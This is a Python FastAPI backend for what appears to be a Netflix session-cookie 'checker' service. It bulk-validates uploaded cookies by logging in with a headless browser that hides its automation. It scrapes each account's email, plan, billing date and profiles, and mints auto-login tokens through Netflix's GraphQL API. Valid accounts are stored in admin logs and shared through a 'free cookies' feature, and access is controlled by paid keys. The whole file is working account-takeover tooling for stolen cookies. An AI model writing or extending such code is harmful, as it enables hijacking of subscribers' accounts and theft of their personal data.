from fastapi import FastAPI, APIRouter, HTTPException, UploadFile, File, Header, Depends
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
import asyncio
from pathlib import Path
from pydantic import BaseModel
from typing import List, Optional
import uuid
from datetime import datetime, timezone, timedelta
import secrets
import jwt
import httpx
from bs4 import BeautifulSoup
import re
import json

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

JWT_SECRET = os.environ['JWT_SECRET']
JWT_ALGORITHM = "HS256"

app = FastAPI()
api_router = APIRouter(prefix="/api")

# --- Pydantic Models ---
class KeyLogin(BaseModel):
    key: str

class KeyCreate(BaseModel):
    label: str
    max_devices: int = 1
    custom_key: Optional[str] = None

class KeyUpdate(BaseModel):
    label: Optional[str] = None
    max_devices: Optional[int] = None

class CookieCheckRequest(BaseModel):
    cookies_text: str
    format_type: str = "auto"

class FreeCookieAdd(BaseModel):
    email: Optional[str] = None
    plan: Optional[str] = None
    country: Optional[str] = None
    member_since: Optional[str] = None
    next_billing: Optional[str] = None
    profiles: List[str] = []
    browser_cookies: str = ""
    full_cookie: str = ""
    nftoken: Optional[str] = None
    nftoken_link: Optional[str] = None

class FreeCookieLimitUpdate(BaseModel):
    limit: int

class TVCodeRequest(BaseModel):
    code: str
    cookie_id: str

# --- Auth Helpers ---
async def get_current_user(authorization: str = Header(None)):
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Not authenticated")
    token_str = authorization.split(" ")[1]
    try:
        payload = jwt.decode(token_str, JWT_SECRET, algorithms=[JWT_ALGORITHM])
        key_doc = await db.access_keys.find_one({"id": payload["key_id"]}, {"_id": 0})
        if not key_doc:
            raise HTTPException(status_code=401, detail="Key not found")
        session_id = payload.get("session_id")
        active = key_doc.get("active_sessions", [])
        if not any(s["session_id"] == session_id for s in active):
            raise HTTPException(status_code=401, detail="Session revoked")
        return {
            "id": key_doc["id"],
            "label": key_doc["label"],
            "is_master": key_doc.get("is_master", False),
            "session_id": session_id
        }
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")

async def require_admin(authorization: str = Header(None)):
    user = await get_current_user(authorization)
    if not user.get("is_master"):
        raise HTTPException(status_code=403, detail="Admin access required")
    return user

# --- Cookie Parsing ---
def parse_netscape_cookies(text):
    cookies = {}
    for line in text.strip().split('\n'):
        line = line.strip()
        if line.startswith('#') or not line:
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]
        elif '=' in line:
            for pair in line.split(';'):
                pair = pair.strip()
                if '=' in pair:
                    k, _, v = pair.partition('=')
                    cookies[k.strip()] = v.strip()
    return cookies

def parse_json_cookies(text):
    try:
        data = json.loads(text)
        if isinstance(data, list):
            return {item['name']: item['value'] for item in data if 'name' in item and 'value' in item}
        if isinstance(data, dict):
            return data
    except Exception:
        pass
    return {}

def parse_cookies_auto(text):
    text = text.strip()
    if text.startswith('[') or text.startswith('{'):
        result = parse_json_cookies(text)
        if result:
            return result
    return parse_netscape_cookies(text)

# --- NFToken Generator (from Netflix GraphQL API) ---
async def generate_nftoken(cookies: dict):
    """Generate Netflix auto-login token from cookies using Netflix's GraphQL API"""
    # Normalize cookie names (case-insensitive lookup)
    norm = {}
    for k, v in cookies.items():
        norm[k] = v
        # Also map lowercase versions
        norm[k.lower()] = v

    # Build cookie string with original names
    netflix_id = norm.get('NetflixId') or norm.get('netflixid')
    secure_id = norm.get('SecureNetflixId') or norm.get('securenetflixid')
    nfvdid = norm.get('nfvdid')

    if not netflix_id or not secure_id:
        return False, None, f"Missing required cookies (NetflixId, SecureNetflixId)"

    # Build full cookie string from all available cookies
    cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])

    payload = {
        "operationName": "CreateAutoLoginToken",
        "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
        "extensions": {
            "persistedQuery": {
                "version": 102,
                "id": "76e97129-f4b5-41a0-a73c-12e674896849"
            }
        }
    }

    nft_headers = {
        'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)',
        'Accept': 'multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json',
        'Content-Type': 'application/json',
        'Origin': 'https://www.netflix.com',
        'Referer': 'https://www.netflix.com/',
        'Cookie': cookie_str
    }

    try:
        async with httpx.AsyncClient(timeout=30.0) as http_client:
            resp = await http_client.post(
                'https://android13.prod.ftl.netflix.com/graphql',
                headers=nft_headers,
                json=payload
            )
            if resp.status_code == 200:
                data = resp.json()
                if 'data' in data and data['data'] and 'createAutoLoginToken' in data['data']:
                    token = data['data']['createAutoLoginToken']
                    return True, token, None
                elif 'errors' in data:
                    return False, None, f"API Error: {json.dumps(data.get('errors', []))}"
                else:
                    return False, None, "Unexpected response"
            else:
                return False, None, f"HTTP {resp.status_code}"
    except Exception as e:
        return False, None, str(e)

# --- Browser Cookie Enrichment (Playwright) ---
async def get_browser_data(cookies: dict):
    """Use headless browser to get full cookies, email from /account/security, and account info"""
    try:
        from playwright.async_api import async_playwright
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu', '--disable-blink-features=AutomationControlled']
            )
            context = await browser.new_context(
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                viewport={'width': 1920, 'height': 1080},
                locale='en-US'
            )

            cookie_list = [{
                "name": name, "value": value,
                "domain": ".netflix.com", "path": "/",
                "secure": True, "sameSite": "None"
            } for name, value in cookies.items()]
            await context.add_cookies(cookie_list)

            page = await context.new_page()
            await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

            info = {"email": None, "plan": None, "country": None, "member_since": None, "next_billing": None, "profiles": []}

            # 1) Visit /browse to establish session and check login
            try:
                await page.goto("https://www.netflix.com/browse", timeout=25000)
                await page.wait_for_load_state("domcontentloaded", timeout=10000)
                await page.wait_for_timeout(2000)
            except Exception:
                pass

            url = page.url
            if '/login' in url or '/LoginHelp' in url:
                await browser.close()
                return False, "", {}, info

            # 2) Capture ALL browser cookies (Netflix sets SecureNetflixId, nfvdid, etc.)
            all_browser_cookies = await context.cookies()
            netflix_cookies = [c for c in all_browser_cookies if 'netflix' in c.get('domain', '').lower()]
            browser_cookies_str = '; '.join([f"{c['name']}={c['value']}" for c in netflix_cookies])
            browser_cookies_dict = {c['name']: c['value'] for c in netflix_cookies}

            # Detect country from URL
            country_match = re.search(r'netflix\.com/([a-z]{2})/', url)
            if country_match:
                info['country'] = country_match.group(1).upper()

            # 3) Visit /account/security to get email
            try:
                await page.goto("https://www.netflix.com/account/security", timeout=20000)
                await page.wait_for_load_state("domcontentloaded", timeout=10000)
                await page.wait_for_timeout(2000)
                security_html = await page.content()

                # Try to find email on the security page
                email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', security_html)
                if email_match:
                    info['email'] = email_match.group(1)
            except Exception as e:
                logger.warning(f"Security page error: {e}")

            # 4) Visit /YourAccount to get plan, billing, profiles
            try:
                await page.goto("https://www.netflix.com/YourAccount", timeout=20000)
                await page.wait_for_load_state("domcontentloaded", timeout=10000)
                await page.wait_for_timeout(3000)
                account_html = await page.content()

                # Extract from reactContext (works if page hasn't fully rendered yet)
                ctx_match = re.search(r'reactContext\s*=\s*({.*?});', account_html, re.DOTALL)
                if ctx_match:
                    try:
                        raw_json = ctx_match.group(1)
                        # Decode JavaScript hex escapes (\xNN) to actual characters
                        raw_json = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), raw_json)
                        # Fix any remaining invalid escape sequences
                        raw_json = re.sub(r'\\(?!["\\/bfnrtu])', r'\\\\', raw_json)
                        ctx = json.loads(raw_json)
                        models = ctx.get('models', {})
                        user_info = models.get('userInfo', {}).get('data', {})
                        if not info['email']:
                            info['email'] = user_info.get('membershipEmail') or user_info.get('email')
                        if not info['country']:
                            info['country'] = user_info.get('countryOfSignup') or user_info.get('currentCountry')
                        info['member_since'] = format_member_since(user_info.get('memberSince'))
                        plan_data = models.get('planInfo', {}).get('data', {})
                        account_data = models.get('accountInfo', {}).get('data', {})
                        # Plan from maxStreams (most reliable - doesn't change with language)
                        max_streams = account_data.get('maxStreams')
                        if max_streams is not None:
                            if max_streams >= 4:
                                info['plan'] = 'Premium (UHD)'
                            elif max_streams >= 2:
                                info['plan'] = 'Standard (HD)'
                            else:
                                info['plan'] = 'Basic'
                            logger.info(f"Plan from maxStreams={max_streams}: {info['plan']}")
                        # Fallback: try planInfo.planName
                        if not info['plan']:
                            raw_plan = plan_data.get('planName')
                            if raw_plan:
                                info['plan'] = normalize_plan_name(raw_plan)
                        if not info['email'] and account_data.get('emailAddress'):
                            info['email'] = account_data['emailAddress']
                        if not info['country'] and account_data.get('country'):
                            info['country'] = account_data['country']
                        info['next_billing'] = plan_data.get('nextBillingDate')
                        profiles_data = models.get('profiles', {}).get('data', [])
                        info['profiles'] = [pr.get('firstName', pr.get('profileName', 'Profile')) for pr in profiles_data if isinstance(pr, dict)]
                    except Exception as e:
                        logger.warning(f"reactContext parse error: {e}")

                # Method 2: Read plan directly from rendered DOM via JavaScript
                if not info['plan']:
                    try:
                        dom_plan = await page.evaluate("""
                            () => {
                                // Try Netflix account page selectors
                                const selectors = [
                                    '[data-uia="plan-label"]',
                                    '[data-uia="plan-section-label"]',
                                    '.account-section-membersince + .account-section .account-section-item b',
                                    '.planInfo .planName',
                                    '.accountSectionContent .plan-label',
                                ];
                                for (const sel of selectors) {
                                    const el = document.querySelector(sel);
                                    if (el && el.textContent.trim()) return el.textContent.trim();
                                }
                                // Broader: find any element with plan-related text
                                const allText = document.body.innerText;
                                const planPatterns = [
                                    /Premium\\s*(?:\\(UHD\\)|UHD|4K)?/i,
                                    /Standard\\s*(?:with\\s*ads|avec\\s*pub|con\\s*anuncios)?/i,
                                    /Standard\\s*(?:\\(HD\\)|HD)?/i,
                                    /Basic\\s*(?:with\\s*ads)?/i,
                                    /Offre\\s+(?:Premium|Standard|Essentiel|Basique)[^\\n]*/i,
                                ];
                                // Look in window netflix context if available
                                try {
                                    const ctx = window.netflix?.appContext?.state?.models?.planInfo?.data;
                                    if (ctx?.planName) return ctx.planName;
                                } catch(e) {}
                                try {
                                    const rc = window.netflix?.reactContext?.models?.planInfo?.data;
                                    if (rc?.planName) return rc.planName;
                                } catch(e) {}
                                return null;
                            }
                        """)
                        if dom_plan:
                            logger.info(f"DOM plan extraction: {dom_plan}")
                            info['plan'] = normalize_plan_name(dom_plan)
                    except Exception as e:
                        logger.warning(f"DOM plan extraction error: {e}")

                # Method 3: Regex for planName in any JSON/script in HTML
                if not info['plan']:
                    plan_matches = re.findall(r'"planName"\s*:\s*"([^"]+)"', account_html)
                    for pm in plan_matches:
                        normalized = normalize_plan_name(pm)
                        if normalized:
                            logger.info(f"JSON regex plan: {pm} -> {normalized}")
                            info['plan'] = normalized
                            break

                # Method 4: Simple text search (last resort - better than no plan)
                if not info['plan']:
                    for pl in ['Standard with ads', 'Standard avec pub', 'Premium', 'Standard', 'Basic with ads', 'Basic', 'Mobile']:
                        if pl.lower() in account_html.lower():
                            info['plan'] = normalize_plan_name(pl)
                            logger.info(f"Text fallback plan: {pl} -> {info['plan']}")
                            break

                # Fallback email from account page
                if not info['email']:
                    m = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', account_html)
                    if m:
                        info['email'] = m.group(1)

            except Exception as e:
                logger.warning(f"Account page error: {e}")

            await browser.close()
            return True, browser_cookies_str, browser_cookies_dict, info

    except Exception as e:
        logger.error(f"Browser data extraction failed: {e}")
        return None, "", {}, {"email": None, "plan": None, "country": None, "member_since": None, "next_billing": None, "profiles": []}

# --- Netflix Checker ---
async def check_netflix_cookie(cookie_text, format_type="auto"):
    if format_type == "json":
        cookies = parse_json_cookies(cookie_text)
    elif format_type == "netscape":
        cookies = parse_netscape_cookies(cookie_text)
    else:
        cookies = parse_cookies_auto(cookie_text)

    if not cookies:
        return {
            "status": "invalid",
            "email": None, "plan": None, "member_since": None,
            "country": None, "next_billing": None, "profiles": [],
            "full_cookie": cookie_text[:500],
            "browser_cookies": "",
            "nftoken": None, "nftoken_link": None,
            "error": "Could not parse cookies"
        }

    result = {
        "status": "expired",
        "email": None, "plan": None, "member_since": None,
        "country": None, "next_billing": None, "profiles": [],
        "full_cookie": cookie_text,
        "browser_cookies": "",
        "nftoken": None, "nftoken_link": None,
        "error": None
    }

    browser_cookies_dict = {}

    # STEP 1: Playwright - get browser cookies + email from /account/security + account info
    try:
        is_logged_in, browser_cookies_str, browser_cookies_dict, info = await get_browser_data(cookies)

        if is_logged_in:
            result["status"] = "valid"
            result["browser_cookies"] = browser_cookies_str
            result["email"] = info.get("email")
            result["plan"] = info.get("plan")
            result["country"] = info.get("country")
            result["member_since"] = info.get("member_since")
            result["next_billing"] = info.get("next_billing")
            result["profiles"] = info.get("profiles", [])
            logger.info(f"Playwright: VALID | email={info.get('email')} | cookies={len(browser_cookies_dict)} keys")
        elif is_logged_in is False:
            logger.info("Playwright: session expired/login redirect")
    except Exception as e:
        logger.warning(f"Playwright failed: {e}")

    # STEP 2: Generate NFToken using BROWSER cookies first, then original cookies as fallback
    # Browser cookies have fresh SecureNetflixId etc. from the session
    nftoken_attempts = []
    if browser_cookies_dict:
        nftoken_attempts.append(("browser", browser_cookies_dict))
    nftoken_attempts.append(("original", cookies))

    for source, nft_cookies in nftoken_attempts:
        try:
            success, nft, nft_err = await generate_nftoken(nft_cookies)
            if success and nft:
                result["status"] = "valid"
                result["nftoken"] = nft
                result["nftoken_link"] = f"https://netflix.com/?nftoken={nft}"
                logger.info(f"NFToken: SUCCESS (from {source} cookies)")
                break
            else:
                logger.info(f"NFToken ({source}): {nft_err}")
        except Exception as e:
            logger.warning(f"NFToken ({source}) error: {e}")

    # STEP 3: httpx fallback for account info if Playwright didn't get it
    if result["status"] != "valid" or not result["email"]:
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            httpx_cookies = browser_cookies_dict if browser_cookies_dict else cookies

            async with httpx.AsyncClient(follow_redirects=True, timeout=20.0) as http:
                # Try /account/security for email
                if not result["email"]:
                    try:
                        sec_resp = await http.get(
                            'https://www.netflix.com/account/security',
                            cookies=httpx_cookies, headers=headers
                        )
                        sec_url = str(sec_resp.url)
                        if '/login' not in sec_url:
                            em = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', sec_resp.text)
                            if em:
                                result['email'] = em.group(1)
                                if result["status"] != "valid":
                                    result["status"] = "valid"
                    except Exception:
                        pass

                # Try /YourAccount for plan, country etc
                if not result["plan"] or not result["country"]:
                    try:
                        acc_resp = await http.get(
                            'https://www.netflix.com/YourAccount',
                            cookies=httpx_cookies, headers=headers
                        )
                        acc_url = str(acc_resp.url)
                        if '/login' not in acc_url:
                            if result["status"] != "valid":
                                result["status"] = "valid"
                            html = acc_resp.text
                            soup = BeautifulSoup(html, 'lxml')
                            for script in soup.find_all('script'):
                                text = script.string or ''
                                if 'reactContext' in text:
                                    match = re.search(r'reactContext\s*=\s*({.*?});', text, re.DOTALL)
                                    if match:
                                        try:
                                            raw_json = match.group(1)
                                            raw_json = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), raw_json)
                                            raw_json = re.sub(r'\\(?!["\\/bfnrtu])', r'\\\\', raw_json)
                                            ctx = json.loads(raw_json)
                                            models = ctx.get('models', {})
                                            user_info = models.get('userInfo', {}).get('data', {})
                                            if not result['email']:
                                                result['email'] = user_info.get('membershipEmail') or user_info.get('email')
                                            if not result['country']:
                                                result['country'] = user_info.get('countryOfSignup') or user_info.get('currentCountry')
                                            if not result['member_since']:
                                                result['member_since'] = format_member_since(user_info.get('memberSince'))
                                            plan_info = models.get('planInfo', {}).get('data', {})
                                            account_data = models.get('accountInfo', {}).get('data', {})
                                            # Plan from maxStreams (most reliable)
                                            max_streams = account_data.get('maxStreams')
                                            if max_streams is not None and not result['plan']:
                                                if max_streams >= 4:
                                                    result['plan'] = 'Premium (UHD)'
                                                elif max_streams >= 2:
                                                    result['plan'] = 'Standard (HD)'
                                                else:
                                                    result['plan'] = 'Basic'
                                            if not result['plan']:
                                                raw_plan = plan_info.get('planName')
                                                if raw_plan:
                                                    result['plan'] = normalize_plan_name(raw_plan)
                                            if not result['email'] and account_data.get('emailAddress'):
                                                result['email'] = account_data['emailAddress']
                                            if not result['country'] and account_data.get('country'):
                                                result['country'] = account_data['country']
                                            if not result['next_billing']:
                                                result['next_billing'] = plan_info.get('nextBillingDate')
                                            if not result['profiles']:
                                                profiles_data = models.get('profiles', {}).get('data', [])
                                                result['profiles'] = [pr.get('firstName', pr.get('profileName', 'Profile')) for pr in profiles_data if isinstance(pr, dict)]
                                        except Exception:
                                            pass
                            if not result['country']:
                                cm = re.search(r'netflix\.com/([a-z]{2})/', acc_url)
                                if cm:
                                    result['country'] = cm.group(1).upper()
                            if not result['email']:
                                em = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', html)
                                if em:
                                    result['email'] = em.group(1)
                            if not result['plan']:
                                # JSON regex for planName
                                plan_matches = re.findall(r'"planName"\s*:\s*"([^"]+)"', html)
                                for pm in plan_matches:
                                    normalized = normalize_plan_name(pm)
                                    if normalized:
                                        result['plan'] = normalized
                                        break
                            # Simple text search as last resort
                            if not result['plan']:
                                for p in ['Standard with ads', 'Standard avec pub', 'Premium', 'Standard', 'Basic with ads', 'Basic', 'Mobile']:
                                    if p.lower() in html.lower():
                                        result['plan'] = normalize_plan_name(p)
                                        break
                        elif result["status"] != "valid":
                            result["status"] = "expired"
                            result["error"] = "Cookie expired - redirected to login"
                    except Exception:
                        pass
        except Exception as e:
            logger.warning(f"httpx fallback error: {e}")

    # If nothing validated the cookie
    if result["status"] == "expired" and not result["error"]:
        result["error"] = "Cookie expired or invalid"

    return result

# --- Auth Routes ---
@app.post("/api/auth/login")
async def login(data: KeyLogin):
    key_doc = await db.access_keys.find_one({"key_value": data.key}, {"_id": 0})
    if not key_doc:
        raise HTTPException(status_code=401, detail="Invalid access key")

    active = key_doc.get("active_sessions", [])
    if len(active) >= key_doc.get("max_devices", 1) and not key_doc.get("is_master"):
        raise HTTPException(status_code=403, detail=f"Device limit reached ({key_doc['max_devices']})")

    session_id = str(uuid.uuid4())
    token = jwt.encode(
        {
            "key_id": key_doc["id"],
            "session_id": session_id,
            "is_master": key_doc.get("is_master", False),
            "exp": datetime.now(timezone.utc) + timedelta(days=7)
        },
        JWT_SECRET, algorithm=JWT_ALGORITHM
    )
    await db.access_keys.update_one(
        {"id": key_doc["id"]},
        {"$push": {"active_sessions": {
            "session_id": session_id,
            "created_at": datetime.now(timezone.utc).isoformat()
        }}}
    )
    return {
        "token": token,
        "user": {
            "id": key_doc["id"],
            "label": key_doc["label"],
            "is_master": key_doc.get("is_master", False)
        }
    }

@api_router.post("/auth/logout")
async def logout(user: dict = Depends(get_current_user)):
    await db.access_keys.update_one(
        {"id": user["id"]},
        {"$pull": {"active_sessions": {"session_id": user["session_id"]}}}
    )
    return {"message": "Logged out"}

@api_router.get("/auth/me")
async def get_me(user: dict = Depends(get_current_user)):
    return {"id": user["id"], "label": user["label"], "is_master": user["is_master"]}

# --- Cookie Check Routes ---

# Concurrency limiter for cookie checks
_check_semaphore = asyncio.Semaphore(5)

async def check_cookie_with_semaphore(block, format_type, job_id, index, total, user):
    async with _check_semaphore:
        result = await check_netflix_cookie(block, format_type)
        # Update job progress in DB
        await db.checks.update_one(
            {"id": job_id},
            {
                "$push": {"results": result},
                "$inc": {
                    "checked_count": 1,
                    "valid_count": 1 if result["status"] == "valid" else 0,
                    "expired_count": 1 if result["status"] == "expired" else 0,
                    "invalid_count": 1 if result["status"] == "invalid" else 0,
                }
            }
        )
        # Log valid cookies
        if result["status"] == "valid":
            await db.valid_logs.insert_one({
                "id": str(uuid.uuid4()),
                "checked_by_key": user["id"],
                "checked_by_label": user["label"],
                "email": result.get("email"),
                "plan": result.get("plan"),
                "country": result.get("country"),
                "member_since": result.get("member_since"),
                "next_billing": result.get("next_billing"),
                "profiles": result.get("profiles", []),
                "browser_cookies": result.get("browser_cookies", ""),
                "full_cookie": result.get("full_cookie", ""),
                "nftoken": result.get("nftoken"),
                "nftoken_link": result.get("nftoken_link"),
                "created_at": datetime.now(timezone.utc).isoformat()
            })
        return result

async def run_bulk_check(job_id, cookie_blocks, format_type, user):
    try:
        tasks = [
            check_cookie_with_semaphore(block, format_type, job_id, i, len(cookie_blocks), user)
            for i, block in enumerate(cookie_blocks)
        ]
        await asyncio.gather(*tasks)
        await db.checks.update_one({"id": job_id}, {"$set": {"status": "done"}})
    except Exception as e:
        logger.error(f"Bulk check error for job {job_id}: {e}")
        await db.checks.update_one({"id": job_id}, {"$set": {"status": "done"}})

@api_router.post("/check")
async def check_cookies(data: CookieCheckRequest, user: dict = Depends(get_current_user)):
    cookie_blocks = re.split(r'\n{3,}|={5,}|-{5,}', data.cookies_text.strip())
    cookie_blocks = [b.strip() for b in cookie_blocks if b.strip()]

    if not cookie_blocks:
        raise HTTPException(status_code=400, detail="No cookies found")

    check_id = str(uuid.uuid4())
    total = len(cookie_blocks)

    await db.checks.insert_one({
        "id": check_id,
        "user_id": user["id"],
        "results": [],
        "total": total,
        "checked_count": 0,
        "valid_count": 0,
        "expired_count": 0,
        "invalid_count": 0,
        "status": "processing",
        "created_at": datetime.now(timezone.utc).isoformat()
    })

    asyncio.create_task(run_bulk_check(check_id, cookie_blocks, data.format_type, user))

    return {
        "id": check_id,
        "total": total,
        "status": "processing"
    }

@api_router.post("/check/file")
async def check_cookies_file(file: UploadFile = File(...), user: dict = Depends(get_current_user)):
    content = await file.read()
    text = content.decode('utf-8', errors='ignore')

    cookie_blocks = re.split(r'\n{3,}|={5,}|-{5,}', text.strip())
    cookie_blocks = [b.strip() for b in cookie_blocks if b.strip()]

    if not cookie_blocks:
        raise HTTPException(status_code=400, detail="No cookies found in file")

    check_id = str(uuid.uuid4())
    total = len(cookie_blocks)

    await db.checks.insert_one({
        "id": check_id,
        "user_id": user["id"],
        "results": [],
        "total": total,
        "checked_count": 0,
        "valid_count": 0,
        "expired_count": 0,
        "invalid_count": 0,
        "status": "processing",
        "filename": file.filename,
        "created_at": datetime.now(timezone.utc).isoformat()
    })

    asyncio.create_task(run_bulk_check(check_id, cookie_blocks, "auto", user))

    return {
        "id": check_id,
        "total": total,
        "status": "processing"
    }


@api_router.post("/check/files")
async def check_cookies_files(files: List[UploadFile] = File(...), user: dict = Depends(get_current_user)):
    all_cookie_blocks = []
    filenames = []

    for file in files:
        content = await file.read()
        text = content.decode('utf-8', errors='ignore')
        cookie_blocks = re.split(r'\n{3,}|={5,}|-{5,}', text.strip())
        cookie_blocks = [b.strip() for b in cookie_blocks if b.strip()]
        all_cookie_blocks.extend(cookie_blocks)
        filenames.append(file.filename)

    if not all_cookie_blocks:
        raise HTTPException(status_code=400, detail="No cookies found in uploaded files")

    check_id = str(uuid.uuid4())
    total = len(all_cookie_blocks)

    await db.checks.insert_one({
        "id": check_id,
        "user_id": user["id"],
        "results": [],
        "total": total,
        "checked_count": 0,
        "valid_count": 0,
        "expired_count": 0,
        "invalid_count": 0,
        "status": "processing",
        "filename": ", ".join(filenames),
        "created_at": datetime.now(timezone.utc).isoformat()
    })

    asyncio.create_task(run_bulk_check(check_id, all_cookie_blocks, "auto", user))

    return {
        "id": check_id,
        "total": total,
        "status": "processing",
        "filenames": filenames
    }


@api_router.get("/check/{job_id}/status")
async def get_check_status(job_id: str, user: dict = Depends(get_current_user)):
    job = await db.checks.find_one({"id": job_id, "user_id": user["id"]}, {"_id": 0})
    if not job:
        raise HTTPException(status_code=404, detail="Job not found")
    return {
        "id": job["id"],
        "status": job.get("status", "done"),
        "total": job["total"],
        "checked_count": job.get("checked_count", job["total"]),
        "valid_count": job.get("valid_count", 0),
        "expired_count": job.get("expired_count", 0),
        "invalid_count": job.get("invalid_count", 0),
        "results": job.get("results", [])
    }

# --- History Routes ---
@api_router.get("/history")
async def get_history(user: dict = Depends(get_current_user)):
    checks = await db.checks.find(
        {"user_id": user["id"]}, {"_id": 0}
    ).sort("created_at", -1).to_list(100)
    return checks

@api_router.delete("/history/{check_id}")
async def delete_check(check_id: str, user: dict = Depends(get_current_user)):
    result = await db.checks.delete_one({"id": check_id, "user_id": user["id"]})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Check not found")
    return {"message": "Deleted"}

# --- NFToken Route ---
@api_router.post("/nftoken")
async def get_nftoken(data: CookieCheckRequest, user: dict = Depends(get_current_user)):
    """Generate NFToken from cookies"""
    if data.format_type == "json":
        cookies = parse_json_cookies(data.cookies_text)
    elif data.format_type == "netscape":
        cookies = parse_netscape_cookies(data.cookies_text)
    else:
        cookies = parse_cookies_auto(data.cookies_text)

    if not cookies:
        raise HTTPException(status_code=400, detail="Could not parse cookies")

    success, token, error = await generate_nftoken(cookies)
    if success:
        return {"success": True, "nftoken": token, "link": f"https://netflix.com/?nftoken={token}"}
    else:
        return {"success": False, "nftoken": None, "error": error}

# --- Admin Routes ---
@api_router.post("/admin/keys")
async def create_key(data: KeyCreate, user: dict = Depends(require_admin)):
    if data.custom_key and data.custom_key.strip():
        key_value = data.custom_key.strip()
        existing = await db.access_keys.find_one({"key_value": key_value}, {"_id": 0})
        if existing:
            raise HTTPException(status_code=400, detail="Key already exists")
    else:
        key_value = secrets.token_urlsafe(16)
    key_id = str(uuid.uuid4())
    await db.access_keys.insert_one({
        "id": key_id,
        "key_value": key_value,
        "label": data.label,
        "max_devices": data.max_devices,
        "active_sessions": [],
        "is_master": False,
        "created_at": datetime.now(timezone.utc).isoformat()
    })
    return {"id": key_id, "key_value": key_value, "label": data.label, "max_devices": data.max_devices}

@api_router.get("/admin/keys")
async def list_keys(user: dict = Depends(require_admin)):
    keys = await db.access_keys.find({}, {"_id": 0}).to_list(100)
    for k in keys:
        k["key_preview"] = k["key_value"][:4] + "****"
        k["session_count"] = len(k.get("active_sessions", []))
    return keys

@api_router.get("/admin/keys/{key_id}/reveal")
async def reveal_key(key_id: str, user: dict = Depends(require_admin)):
    key = await db.access_keys.find_one({"id": key_id}, {"_id": 0})
    if not key:
        raise HTTPException(status_code=404, detail="Key not found")
    return {"key_value": key["key_value"]}

@api_router.patch("/admin/keys/{key_id}")
async def update_key(key_id: str, data: KeyUpdate, user: dict = Depends(require_admin)):
    updates = {}
    if data.label is not None:
        updates["label"] = data.label
    if data.max_devices is not None:
        updates["max_devices"] = data.max_devices
    if not updates:
        raise HTTPException(status_code=400, detail="Nothing to update")
    await db.access_keys.update_one({"id": key_id}, {"$set": updates})
    return {"message": "Updated"}

@api_router.delete("/admin/keys/{key_id}")
async def delete_key(key_id: str, user: dict = Depends(require_admin)):
    key = await db.access_keys.find_one({"id": key_id}, {"_id": 0})
    if not key:
        raise HTTPException(status_code=404, detail="Key not found")
    if key.get("is_master"):
        raise HTTPException(status_code=400, detail="Cannot delete master key")
    await db.access_keys.delete_one({"id": key_id})
    return {"message": "Key deleted"}

@api_router.delete("/admin/keys/{key_id}/sessions/{session_id}")
async def revoke_session(key_id: str, session_id: str, user: dict = Depends(require_admin)):
    await db.access_keys.update_one(
        {"id": key_id},
        {"$pull": {"active_sessions": {"session_id": session_id}}}
    )
    return {"message": "Session revoked"}

# --- Admin Logs Routes ---
@api_router.get("/admin/logs")
async def get_admin_logs(user: dict = Depends(require_admin)):
    logs = await db.valid_logs.find({}, {"_id": 0}).sort("created_at", -1).to_list(500)
    return logs

@api_router.delete("/admin/logs/{log_id}")
async def delete_admin_log(log_id: str, user: dict = Depends(require_admin)):
    result = await db.valid_logs.delete_one({"id": log_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Log not found")
    return {"message": "Log deleted"}

@api_router.delete("/admin/logs")
async def clear_admin_logs(user: dict = Depends(require_admin)):
    await db.valid_logs.delete_many({})
    return {"message": "All logs cleared"}

# --- Free Cookies Routes ---
@api_router.post("/admin/free-cookies")
async def add_free_cookie(data: FreeCookieAdd, user: dict = Depends(require_admin)):
    cookie_id = str(uuid.uuid4())
    await db.free_cookies.insert_one({
        "id": cookie_id,
        "email": data.email,
        "plan": data.plan,
        "country": data.country,
        "member_since": data.member_since,
        "next_billing": data.next_billing,
        "profiles": data.profiles,
        "browser_cookies": data.browser_cookies,
        "full_cookie": data.full_cookie,
        "nftoken": data.nftoken,
        "nftoken_link": data.nftoken_link,
        "added_by": user["id"],
        "created_at": datetime.now(timezone.utc).isoformat()
    })
    return {"id": cookie_id, "message": "Free cookie added"}

@api_router.get("/admin/free-cookies")
async def get_all_free_cookies_admin(user: dict = Depends(require_admin)):
